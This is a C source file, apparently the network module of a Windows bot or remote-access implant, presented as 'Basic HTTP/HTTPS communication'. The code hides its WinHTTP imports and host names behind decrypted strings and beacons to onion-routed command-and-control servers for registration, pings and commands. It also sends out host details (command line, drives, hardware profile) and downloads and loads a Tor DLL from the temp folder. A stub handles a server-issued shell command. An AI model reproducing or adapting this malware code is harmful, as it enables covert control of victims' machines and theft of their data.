/*
 * Module:  http.c
 * Author:  Toni <matzeton@googlemail.com>
 * Purpose: Basic HTTP/HTTPS communication.
 */

#include "compat.h"

#ifdef __MINGW32__
#include "http.h"
#include "math.h"
#include "utils.h"
#include "file.h"
#include "crypt.h"
#include "crypt_strings.h"


typedef HINTERNET (WINAPI *WinHttpOpenFunc)             (LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef BOOL      (WINAPI *WinHttpCloseHandleFunc)      (HINTERNET);
typedef BOOL      (WINAPI *WinHttpQueryOptionFunc)      (HINTERNET, DWORD, LPVOID, LPDWORD);
typedef WINHTTP_STATUS_CALLBACK
                  (WINAPI *WinHttpSetStatusCallbackFunc)(HINTERNET, WINHTTP_STATUS_CALLBACK, DWORD, DWORD_PTR);
typedef HINTERNET (WINAPI *WinHttpConnectFunc)          (HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET (WINAPI *WinHttpOpenRequestFunc)      (HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL      (WINAPI *WinHttpSendRequestFunc)      (HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL      (WINAPI *WinHttpReceiveResponseFunc)  (HINTERNET, LPVOID);
typedef BOOL      (WINAPI *WinHttpQueryDataAvailableFunc)(HINTERNET, LPDWORD);
typedef BOOL      (WINAPI *WinHttpQueryHeadersFunc)     (HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);
typedef BOOL      (WINAPI *WinHttpReadDataFunc)         (HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL      (WINAPI *WinHttpWriteDataFunc)        (HINTERNET, LPCVOID, DWORD, LPDWORD);
typedef BOOL      (WINAPI *WinHttpAddRequestHeadersFunc)(HINTERNET, LPCWSTR, DWORD, DWORD);

struct HttpApi {
    BOOL                         initialized;
    HINTERNET                    hSession;
    WinHttpOpenFunc              Open;
    WinHttpCloseHandleFunc       Close;
    WinHttpQueryOptionFunc       Query;
    WinHttpSetStatusCallbackFunc SetCallback;
    WinHttpConnectFunc           Connect;
    WinHttpOpenRequestFunc       Request;
    WinHttpSendRequestFunc       Send;
    WinHttpReceiveResponseFunc   Respone;
    WinHttpQueryDataAvailableFunc Data;
    WinHttpQueryHeadersFunc      Header;
    WinHttpReadDataFunc          Read;
    WinHttpAddRequestHeadersFunc AddHdr;

    uint32_t                     state;
    /* client generated network info */
    char                         sid[SID_LEN+1];
    char                         startMarker[MARKER_SIZ+1];
    /* server generated network info */
    rrbuff                       aeskey[AESKEY_SIZ];
    uint32_t                     next_ping;
};

static struct HttpApi* hApi = NULL;


#define DECRYPT_AND_LIBGETPROC(i, lib, type, dest) { DBUF(i, tmp); dest = (type)getproc(lib, tmp); }
#define DECRYPT_AND_GETPROC(i, type, dest)         DECRYPT_AND_LIBGETPROC(i, httplib, type, dest)
int initHttp(LoadLibraryFunc loadlib, GetProcAddressFunc getproc)
{
    if (hApi == NULL) {
        hApi = COMPAT(calloc)(1, sizeof(struct HttpApi));
        if (hApi == NULL)
            return ERR_HTTP_PRE;

        DBUF(HTTPDLL_ENUM, __nameHDLL);
        HMODULE httplib = loadlib(__nameHDLL);
        if (httplib == NULL)
            return ERR_HTTP_PRE;

        DECRYPT_AND_GETPROC(HTTPFUNC_OPEN_ENUM,        WinHttpOpenFunc,               hApi->Open);
        DECRYPT_AND_GETPROC(HTTPFUNC_CLOSE_ENUM,       WinHttpCloseHandleFunc,        hApi->Close);
        DECRYPT_AND_GETPROC(HTTPFUNC_QUERYOPT_ENUM,    WinHttpQueryOptionFunc,        hApi->Query);
        DECRYPT_AND_GETPROC(HTTPFUNC_CALLBACK_ENUM,    WinHttpSetStatusCallbackFunc,  hApi->SetCallback);
        DECRYPT_AND_GETPROC(HTTPFUNC_CONNECT_ENUM,     WinHttpConnectFunc,            hApi->Connect);
        DECRYPT_AND_GETPROC(HTTPFUNC_REQUEST_ENUM,     WinHttpOpenRequestFunc,        hApi->Request);
        DECRYPT_AND_GETPROC(HTTPFUNC_SEND_ENUM,        WinHttpSendRequestFunc,        hApi->Send);
        DECRYPT_AND_GETPROC(HTTPFUNC_RESPONSE_ENUM,    WinHttpReceiveResponseFunc,    hApi->Respone);
        DECRYPT_AND_GETPROC(HTTPFUNC_QUERYDATA_ENUM,   WinHttpQueryDataAvailableFunc, hApi->Data);
        DECRYPT_AND_GETPROC(HTTPFUNC_QUERYHEADER_ENUM, WinHttpQueryHeadersFunc,       hApi->Header);
        DECRYPT_AND_GETPROC(HTTPFUNC_READ_ENUM,        WinHttpReadDataFunc,           hApi->Read);
        DECRYPT_AND_GETPROC(HTTPFUNC_ADDHDR_ENUM,      WinHttpAddRequestHeadersFunc,  hApi->AddHdr);

        if (!hApi->Open || !hApi->Close ||
                !hApi->Query || !hApi->SetCallback ||
                !hApi->Connect || !hApi->Request ||
                !hApi->Request || !hApi->Send ||
                !hApi->Respone || !hApi->Data ||
                !hApi->Header  || !hApi->Read || !hApi->AddHdr)
            return ERR_HTTP_PRE;
    }

    char* sid = __genRandAlphaNumStr(SID_LEN);
    *(char*)(sid+0) &= (~SID_ZEROES1 & 0xFF);
    *(char*)(sid+1) &= (~SID_ZEROES0 & 0xFF);
    *(char*)(sid+2) &= (~SID_ZEROES1 & 0xFF);
    *(char*)(sid+3) &= (~SID_ZEROES1 & 0xFF);
    *(char*)(sid+4) &= (~SID_ZEROES0 & 0xFF);
    for (size_t i = 0; i < 5; ++i)
        if ( !isalpha(*(char*)(sid+i)) )
            *(char*)(sid+i) = 0x42;
    COMPAT(memcpy)(&hApi->sid[0], sid, SID_LEN);
    COMPAT(free)(sid);

    char* marker = __genRandAlphaNumStr(MARKER_SIZ);
    COMPAT(memcpy)(&hApi->startMarker[0], marker, MARKER_SIZ);
    COMPAT(free)(marker);

    hApi->state = ST_UNAUTH;

    DBUF(HTTP_UA_ENUM, __ua);
    int wUaLen = 0;
    LPWSTR szwUa = COMPAT(toWideChar)(__ua, COMPAT(strnlen)(__ua, CLEN(HTTP_UA_ENUM)), &wUaLen);
    if (!hApi->initialized) {
        hApi->hSession = hApi->Open((wUaLen > 0 ? szwUa : NULL),
                                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                WINHTTP_NO_PROXY_NAME, 
                                WINHTTP_NO_PROXY_BYPASS, 0);
        hApi->initialized = (hApi->hSession != NULL);
    }
    COMPAT(free)(szwUa);

    return ERR_HTTP_OK;
}

#define RETEND(retval) { ret = retval; goto end; }
int sendHttpRequest(http_args* htArgs, rrbuff* recv_buf, rrsize* recv_siz, DWORD* pStatusCode)
{
    if (!hApi || hApi->initialized != TRUE)
        return ERR_HTTP_PRE;
#ifdef _PRE_RELEASE
    COMPAT(printf)("%s: %s %s\r\n", htArgs->host, htArgs->method, htArgs->resource);
#endif

    BOOL bResults = FALSE;
    HINTERNET hConnect = NULL,
              hRequest = NULL;
    LPWSTR szwHost = NULL, szwRes = NULL, szwMet = NULL;
    DWORD dwSize = 0;
    int ret = ERR_HTTP_OK;

    if (htArgs->hostLen > 0) {
        int wHostLen = 0;
        szwHost = COMPAT(toWideChar)(htArgs->host, htArgs->hostLen, &wHostLen);
        if (wHostLen > 0 && szwHost) {
            hConnect = hApi->Connect(hApi->hSession, szwHost,
#ifndef _HTTP_LOCALHOST
                    INTERNET_DEFAULT_HTTP_PORT
#else
                    8080
#endif
                    , 0);
        }
    } else RETEND(ERR_HTTP_PRE);

    if (hConnect) {
        int wResLen = 0;
        szwRes = COMPAT(toWideChar)(htArgs->resource, htArgs->resourceLen, &wResLen);
        int wMetLen = 0;
        szwMet = COMPAT(toWideChar)(htArgs->method, htArgs->methodLen, &wMetLen);
        hRequest = hApi->Request(hConnect, szwMet, szwRes, NULL,
                                     WINHTTP_NO_REFERER,
                                     WINHTTP_DEFAULT_ACCEPT_TYPES,
                                     WINHTTP_FLAG_REFRESH);
    } else RETEND(ERR_HTTP_CONNECT);

    if (hRequest) {
        if (htArgs->uploadLen == 0) {
            bResults = hApi->Send(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
        } else {
            DBUF(HTTP_HEADERS_ENUM, __hdr);
            int szwHeaderLen = 0;
            LPWSTR szwHeader = COMPAT(toWideChar)(__hdr, COMPAT(strnlen)(__hdr, CLEN(HTTP_HEADERS_ENUM)), &szwHeaderLen);
            if (hApi->AddHdr(hRequest, szwHeader, szwHeaderLen, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE) == TRUE) {
                bResults = hApi->Send(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                  htArgs->upload, htArgs->uploadLen,  htArgs->uploadLen, 0);
            } else {
#ifdef _PRE_RELEASE
                COMPAT(printf)("AddHeader failed with %u (%X)\n", (unsigned)_GetLastError(), (unsigned)_GetLastError());
#endif
            }
            COMPAT(free)(szwHeader);
        }
    } else RETEND(ERR_HTTP_REQUEST);

    if (bResults == TRUE) {
        bResults = hApi->Respone(hRequest, NULL);
    } else RETEND(ERR_HTTP_SEND);

    if (pStatusCode && bResults == TRUE) {
        dwSize = sizeof(*pStatusCode);
        bResults = hApi->Header(hRequest,
                        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX,
                        pStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);
    }

    DWORD dwCurExp = 12, dwCurUsd = 0;
    DWORD dwCurMax = __pow(2, dwCurExp);
    rrbuff Recv = calloc(dwCurMax, 1);
    if (bResults && *pStatusCode == 200 && recv_buf && recv_siz) {
        do {
            if (!hApi->Data(hRequest, &dwSize))
                dwSize = 0;
            if (!dwSize)
                break;
#ifdef _PRE_RELEASE
            COMPAT(printf)("Chunk Size: %u\t(%u/%u)\n", (unsigned)dwSize, (unsigned)dwCurUsd, (unsigned)dwCurMax);
#endif
            while (dwCurMax <= dwCurUsd + dwSize) {
                dwCurExp++;
                dwCurMax = __pow(2, dwCurExp);
                Recv = COMPAT(realloc)(Recv, dwCurMax);
            }
            DWORD dwDownloaded;
            if (!hApi->Read(hRequest, (rrbuff)(Recv + dwCurUsd), dwSize, &dwDownloaded)) {
                RETEND(ERR_HTTP_READ);
            }
            dwCurUsd += dwDownloaded;
        } while (dwSize > 0);
        *recv_buf = Recv;
        *recv_siz = dwCurUsd;
    } else { RETEND(ERR_HTTP_RESPONSE); }

end:
    if (hRequest)
        hApi->Close(hConnect);
    if (hConnect)
        hApi->Close(hRequest);
    COMPAT(free)(szwHost);
    COMPAT(free)(szwRes);
    COMPAT(free)(szwMet);
    return ret;
}

int sendWeb2Tor(LPCSTR resource, LPCSTR method, rrbuff send_buf, rrsize send_siz, rrbuff* recv_buf, rrsize* recv_siz)
{
#ifdef _HTTP_LOCALHOST
    DBUF(HTTP_HOST_LOCAL_ENUM, __localHost);
#else
    DBUF(HTTP_HOSTS_ENUM, __hosts);
    DBUF(HTTP_ONION_ENUM, __onionHost);
#endif
    char* cur   = NULL;
    char* end   = NULL;
    int ret = -1;

#ifdef _HTTP_LOCALHOST
    while (get_string_in_strings_d(__localHost, &cur, &end) == 0)
#else
    while (get_string_in_strings_d(__hosts, &cur, &end) == 0)
#endif
    {
#ifdef _HTTP_LOCALHOST
        char* szRealHost = __localHost;
#else
        size_t nRealHost = COMPAT(strlen)(__onionHost) + COMPAT(strlen)(cur);
        char* szRealHost = COMPAT(calloc)(nRealHost + 1, sizeof(char));
        COMPAT(snprintf)(szRealHost, nRealHost + 1, cur, __onionHost);
#endif

        struct http_args hArgs = {0};
        hArgs.host        = szRealHost;
        hArgs.hostLen     = strlen(hArgs.host);
        hArgs.resource    = resource;
        hArgs.resourceLen = strlen(hArgs.resource);
        hArgs.method      = method;
        hArgs.methodLen   = strlen(hArgs.method);
        hArgs.upload      = send_buf;
        hArgs.uploadLen   = send_siz;

        rrbuff szOut      = NULL;
        rrsize outSiz    = 0;
        DWORD dwStatus    = 0;
        if ( (ret = sendHttpRequest(&hArgs, &szOut, &outSiz, &dwStatus)) != 0) {
#ifdef _PRE_RELEASE
            COMPAT(printf)("HTTP ERROR(Return: %d, Status: %d, Recv: %u): %s %s %s\n", ret, (int)dwStatus, (unsigned)outSiz, method, szRealHost, resource);
#endif
        } else {
#ifdef _PRE_RELEASE
            COMPAT(printf)("HTTP(Return: %d, Status: %d, Recv: %u):\n\t%s %s %s\n\tSIZE: %u\n", ret, (int)dwStatus, (unsigned)outSiz, method, szRealHost, resource, (unsigned)send_siz);
#endif
        }

        if (recv_siz) {
            *recv_siz = outSiz;
        }
        if (recv_buf) {
            *recv_buf = szOut;
        } else {
            COMPAT(free)(szOut);
        }
        COMPAT(free)(szRealHost);
        if (dwStatus == 200)
            break;
    }

    return ret;
}

static inline int downloadFileToMem(LPCSTR resource, LPCSTR method, rrbuff* p_buf, rrsize* pn_buf)
{
    return sendWeb2Tor(resource, method, NULL, 0, p_buf, pn_buf);
}

int downloadLibtor(char** pLibPath)
{
    if (!hApi)
        return ERR_HTTP_PRE;
    DBUF(DLLSECTION_ENUM, __path);
    DBUF(HTTP_URI_LIBTOR_ENUM, __fmt);

    SIZE_T resLen = COMPAT(strnlen)(__fmt, CLEN(HTTP_URI_LIBTOR_ENUM)) + COMPAT(strnlen)(__path, CLEN(DLLSECTION_ENUM)) + SID_LEN + 1;
    LPSTR res = COMPAT(calloc)(resLen, sizeof(char));

    COMPAT(snprintf)(res, resLen, __fmt, __path, &hApi->sid[0]);
    DBUF(HTTP_METHOD_ENUM, __meth);

    rrbuff rbuf = NULL;
    rrsize rsiz = 0;
    int ret = downloadFileToMem(res, __meth, &rbuf, &rsiz);

    if (ret == ERR_HTTP_OK) {
        if (rbuf && rsiz > 0) {
            DBUF(HTTP_LIBTOR_DLL_ENUM, __libonion_fmt);
            char* __libonion_path = COMPAT(calloc)(MAX_PATH+1, sizeof(char));
            char* __tmp_path = COMPAT(calloc)(MAX_PATH+1, sizeof(char));


            if (_GetTempPath(MAX_PATH, __tmp_path) <= 0 ||
                    COMPAT(snprintf)(__libonion_path, MAX_PATH+1, __libonion_fmt, __tmp_path) <= 0 ||
                    bBufToFileName(__libonion_path, OF_WRITEACCESS|OF_CREATENEW, rbuf, rsiz) != TRUE) {
                ret = -1;
            }
#ifdef _PRE_RELEASE
            COMPAT(printf)("Saved DLL (%u bytes) to: %s\n", rsiz, __libonion_path);
#endif

            COMPAT(free)(__tmp_path);
            if (!pLibPath) {
                COMPAT(free)(__libonion_path);
            } else {
                *pLibPath = __libonion_path;
            }
            COMPAT(free)(rbuf);
        }
    } else ret = -2;

    COMPAT(free)(res);
    return ret;
}

tor_main_t
loadLibtor(char* libPath, HMODULE* hmod, LoadLibraryFunc loadlib, GetProcAddressFunc getproc)
{
    HMODULE lib = loadlib(libPath);
    tor_main_t tm = NULL;
    if (lib) {
        if (hmod)
            *hmod = lib;
        DBUF(HTTP_LIBTOR_MAIN_ENUM, __proc);
        tm = (tor_main_t) getproc(lib, __proc);
    }
    return tm;
}

int sendRequest(rrcode query_code, rrbuff send_buf, rrsize send_siz, rrbuff* recv_buf, rrsize* recv_siz)
{
    if (!hApi)
        return ERR_HTTP_PRE;
    DBUF(DLLSECTION_ENUM, __path);
    DBUF(HTTP_URI_ENUM, __fmt);

    SIZE_T resLen = COMPAT(strlen)(__fmt) + COMPAT(strlen)(__path) + SID_LEN + MARKER_SIZ + RND_LEN + 1;
    LPSTR res = COMPAT(calloc)(resLen, sizeof(char));
    LPSTR rnd = __genRandAlphaNumStr(RND_LEN);

    COMPAT(snprintf)(res, resLen, __fmt, __path, &hApi->sid[0], &hApi->startMarker[0], rnd);
    DBUF(HTTP_METHOD_ENUM, __meth);

    DBUF(HTTP_SUBHEADERS_BEG_ENUM, __subhdr_beg);
    DBUF(HTTP_SUBHEADERS_END_ENUM, __subhdr_end);
    size_t __subhdr_beg_len = COMPAT(strnlen)(__subhdr_beg, CLEN(HTTP_SUBHEADERS_BEG_ENUM));
    size_t __subhdr_end_len = COMPAT(strnlen)(__subhdr_end, CLEN(HTTP_SUBHEADERS_END_ENUM));

    rrbuff reqbuf = COMPAT(calloc)(sizeof(struct http_resp) + send_siz + __subhdr_beg_len + __subhdr_end_len, 1);
    COMPAT(memcpy)(reqbuf, __subhdr_beg, __subhdr_beg_len);
    COMPAT(memcpy)(reqbuf + __subhdr_beg_len + send_siz + sizeof(struct http_resp), __subhdr_end, __subhdr_end_len);

    struct http_resp* req = (struct http_resp*)(reqbuf + __subhdr_beg_len);
    COMPAT(memcpy)(&req->startMarker[0], &hApi->startMarker[0], MARKER_SIZ);
    req->respCode = query_code;
    req->pkgsiz = send_siz;

    if (req && send_buf && send_siz > 0) {
        COMPAT(memcpy)(&req->pkgbuf[0], send_buf, send_siz);
    }
    int ret = sendWeb2Tor(res, __meth, reqbuf, sizeof(struct http_resp) + send_siz + __subhdr_beg_len + __subhdr_end_len, recv_buf, recv_siz);
    COMPAT(free)(req);

    COMPAT(free)(rnd);
    COMPAT(free)(res);
    return ret;
}

static int
parseAndRunShell(http_resp* hResp)
{
    if (hResp->pkgsiz < sizeof(struct resp_shell))
        return 0x89;

    struct resp_shell* rsp = (struct resp_shell*)hResp->pkgbuf;
    if (hResp->pkgsiz != sizeof(struct resp_shell) +
                             rsp->fileLen +
                             rsp->paramLen +
                             rsp->dirLen)
        return 0x22;

    return 0;
}

static struct req_info*
createInfo(rrsize* totalSize)
{
#define MAX_DEVS 16
    char* cmdLine     = _GetCommandLine();
    uint16_t cmdLineLen = COMPAT(strlen)(cmdLine);

    struct LogicalDrives* devs = COMPAT(calloc)(MAX_DEVS, sizeof(struct LogicalDrives));
    uint8_t devsLen            = dwEnumDrives(devs, MAX_DEVS);

    rrsize __totalSize = sizeof(struct req_info) + \
                         cmdLineLen*sizeof(char) + \
                         devsLen*sizeof(struct LogicalDrives);
    struct req_info* ri = COMPAT(calloc)(1, __totalSize);
    if (totalSize)
        *totalSize = __totalSize;
    if (!ri)
        return NULL;

    rrbuff dataPtr      = ri->data;

    _GetSystemInfo(&ri->si);
    _GetCurrentHwProfile(&ri->hw);

    COMPAT(memcpy)(dataPtr, cmdLine, cmdLineLen);
    ri->cmdLineLen = cmdLineLen;
    dataPtr       += cmdLineLen;

    COMPAT(memcpy)(dataPtr, devs, devsLen*sizeof(struct LogicalDrives));
    ri->devsLen    = devsLen;

    COMPAT(free)(devs);
    return ri;
}

int httpLoopAtLeastOnce(void)
{
    int ret = -1;
    rrbuff recv = NULL, send = NULL;
    rrsize rsiz = 0, ssiz = 0;

    rrcode nextCode = 0;
    if (hApi->state & ST_UNAUTH) {
        nextCode = RC_REGISTER;
    }
    rflags lastFlags;
    do {
        lastFlags = 0;

        /* Client side actions */
        if (nextCode == 0) {
            nextCode = RC_PING;
        }
#ifdef _PRE_RELEASE
        COMPAT(printf)("SendRequest(Code: %u (0x%X), Size: %u (0x%X))\n", nextCode, nextCode, ssiz, ssiz);
#endif
        int sret = sendRequest(nextCode, send, ssiz, &recv, &rsiz);
        nextCode = 0;
        if (send && ssiz > 0) {
            COMPAT(free)(send);
            send = NULL;
            ssiz = 0;
        }

        /* Server side actions */
        if (sret == ERR_HTTP_OK && rsiz > 0) {
            size_t bufOff = 0;
            http_resp* hResp = NULL;

            while ((ret = parseResponse(recv, rsiz, &hResp, &bufOff, &hApi->startMarker[0])) == RSP_OK && hResp) {
                lastFlags = hResp->respFlags;

                if (hApi->state & ST_UNAUTH || hResp->respCode == RC_REGISTER) {
                    /* request aeskey, etc, ... */
                    if (hResp->respCode != RC_REGISTER || hResp->pkgsiz != sizeof(struct resp_register)) {
#ifdef _PRE_RELEASE
                        COMPAT(printf)("I wanted an RC_REGISTER pkg but did not get a valid one! (Code: %u (0x%X), Size: %u (0x%X))\n",
                            hResp->respCode, hResp->respCode, hResp->pkgsiz, hResp->pkgsiz);
#endif
                        continue;
                    }
                    struct resp_register* rsp = (struct resp_register*)&hResp->pkgbuf[0];
                    COMPAT(memcpy)(&hApi->aeskey[0], &rsp->aeskey[0], AESKEY_SIZ);
#ifdef _PRE_RELEASE
                    if (!(hApi->state & ST_UNAUTH)) {
                        COMPAT(printf)("%s\n", "Re-Register forced");
                    }
#endif
                    hApi->state &= ~ST_UNAUTH;
#ifdef _PRE_RELEASE
                    COMPAT(printf)("AES key: ");
                    __printByteBuf((const rrbuff)&hApi->aeskey[0], AESKEY_SIZ);
                    COMPAT(printf)("Next Ping: %u (0x%X)\n", rsp->next_ping, rsp->next_ping);
#endif
                }
                else if (hResp->respCode == RC_PING) {
                    /* ping */
                    struct resp_pong* rsp = (struct resp_pong*)&hResp->pkgbuf[0];
                    hApi->next_ping = rsp->next_ping;
#ifdef _PRE_RELEASE
                    COMPAT(printf)("PING-PONG: Next Ping: %u (0x%X)\n", rsp->next_ping, rsp->next_ping);
#endif
                }
                else if (hResp->respCode == RC_INFO) {
                    /* send host info */
                    send = (rrbuff)createInfo(&ssiz);
                    nextCode = RC_INFO;
                    lastFlags = RF_AGAIN;
                    break;
                }
                else if (hResp->respCode == RC_SHELL) {
                    /* execute shell */
                    if (parseAndRunShell(hResp) == 0) {
                    }
                }

#ifdef _PRE_RELEASE
                if (hResp->respFlags == RF_ERROR) {
                    COMPAT(printf)("Response (Code: %d (0x%X)) failed.\n", hResp->respCode, hResp->respCode);
                }
#endif
            }
        }

        /* free memory */
        if (recv && rsiz > 0) {
            COMPAT(free)(recv);
            recv = NULL;
            rsiz = 0;
        }

    } while (lastFlags == RF_AGAIN);
#ifdef _PRE_RELEASE
    if (ret != -1)
        COMPAT(printf)("Last parseResponse returned: %d\n", ret);
#ifdef _EXTRA_VERBOSE
    COMPAT(printf)("%s\n", "----- End Of Response -----");
#endif
#endif

    return ret;
}

uint32_t getNextPingTime(void)
{
    if (hApi)
        return hApi->next_ping;
    else
        return 0;
}
#endif /* __MINGW32__ */

#include "http.h"
#include "compat.h"
#ifdef _HOST_TOOLS
#include "helper.h"
#include "utils.h"
#endif

int parseResponse(const rrbuff recv_buf, rrsize recv_siz, http_resp** hResp, size_t* pBufOff, const char* startMarker)
{
    if (!hResp || !pBufOff)
        return RSP_ERR;
    if (*pBufOff >= recv_siz)
        return RSP_ERR;

    recv_siz -= *pBufOff;
    /* check start marker */
    const rrbuff marker = (const rrbuff) COMPAT(memmem)((recv_buf + *pBufOff), recv_siz, startMarker, MARKER_SIZ);
    if (!marker)
        return RSP_PROTOCOL;
    rrsize rel_size = (marker - (recv_buf + *pBufOff));
    recv_siz -= rel_size;
    *pBufOff += rel_size;

    /* check minimal protocol size */
    if (recv_siz < sizeof(struct http_resp))
        return RSP_WRONGSIZE;
    recv_siz -= sizeof(struct http_resp);

    /* get ptr */
    *hResp = (http_resp*)marker;
    /* validate pkg size */
    if ((*hResp)->pkgsiz > recv_siz)
        return RSP_WRONGPKGSIZE;

    *pBufOff += sizeof(struct http_resp) + (*hResp)->pkgsiz;

    /* validate RFs and RCs */
    bool flagFound = false;
    /* validate RFs */
    rflags rfs[] = RF_ALL;
    if ((*hResp)->respFlags != 0) { /* client should never set rflags another value then 0 */
        for (unsigned i = 0; i < SIZEOF(rfs); ++i) {
            if (rfs[i] == (*hResp)->respFlags) {
                flagFound = true;
                break;
            }
        }
        if (! flagFound)
            return RSP_PROTOCOL_FLAG;
    }
    flagFound = false;
    /* validate RCs */
    rrcode rcs[] = RC_ALL;
    for (unsigned i = 0; i < SIZEOF(rcs); ++i) {
        if (rcs[i] == (*hResp)->respCode) {
            flagFound = true;
            break;
        }
    }
    if (! flagFound)
        return RSP_PROTOCOL_CODE;

#ifdef _PRE_RELEASE
    COMPAT(printf)("HTTP RESPONSE(Size: %u, Code: %u (0x%X), Flags: %u (0x%X))\n", (rrsize)(*hResp)->pkgsiz, (*hResp)->respCode, (*hResp)->respCode, (*hResp)->respFlags, (*hResp)->respFlags);
#ifdef _EXTRA_VERBOSE
    if ((*hResp)->pkgsiz > 0) {
        const rrbuff pkg = (const rrbuff) &(*hResp)->pkgbuf[0];
        COMPAT(printf)("HTTP DATA(buf: %p, pkg: %p): ", marker, pkg);
        __printByteBuf(pkg, (*hResp)->pkgsiz);
    }
#endif
#endif
    return RSP_OK;
}

int addRequest(rrbuff* send_buf, rrsize* send_siz, struct http_resp* hresp)
{
    uint8_t sizA = (uint8_t)__rdtsc();
    uint8_t sizB = (uint8_t)__rdtsc();

    rrsize new_siz = *send_siz + sizA + sizeof(*hresp) + hresp->pkgsiz + sizB;
    if (*send_buf)
        *send_buf = COMPAT(realloc)(*send_buf, new_siz*sizeof(**send_buf));
    else
        *send_buf = COMPAT(calloc)(new_siz, sizeof(**send_buf));
    if (! *send_buf) return RSP_ERR;
    rrbuff new_buf = *send_buf + *send_siz;

    COMPAT(memset)(new_buf, 'A', sizA);
    COMPAT(memcpy)(new_buf + sizA, hresp, sizeof(*hresp) + hresp->pkgsiz);
    COMPAT(memset)(new_buf + sizA + sizeof(*hresp) + hresp->pkgsiz, 'B', sizB);
    *send_siz = new_siz;
    return RSP_OK;
}
